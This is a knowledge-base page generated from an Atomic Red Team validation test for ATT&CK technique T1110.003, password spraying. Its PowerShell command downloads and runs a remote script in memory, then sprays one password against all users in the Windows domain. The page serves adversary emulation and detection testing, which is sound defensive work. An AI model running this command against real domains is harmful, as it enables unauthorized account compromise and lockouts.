---
atomic_guid: "263ae743-515f-4786-ac7d-41ef3a0d4b2b"
title: "Password Spray (DomainPasswordSpray)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1110.003"
attack_technique_name: "Brute Force: Password Spraying"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/T1110.003.yaml"
build_date: "2026-04-27 19:12:27"
executor: "powershell"
aliases:
  - "263ae743-515f-4786-ac7d-41ef3a0d4b2b"
  - "Password Spray (DomainPasswordSpray)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Perform a domain password spray using the DomainPasswordSpray tool. It will try a single password against all users in the domain

https://github.com/dafthack/DomainPasswordSpray

## ATT&CK Mapping

- [[kb/attack/techniques/T1110-brute_force#^t1110003-password-spraying|T1110.003: Password Spraying]]

## Input Arguments

### domain

- description: Domain to brute force against
- type: string
- default: $Env:USERDOMAIN

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain #{domain} -Force
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/T1110.003.yaml)
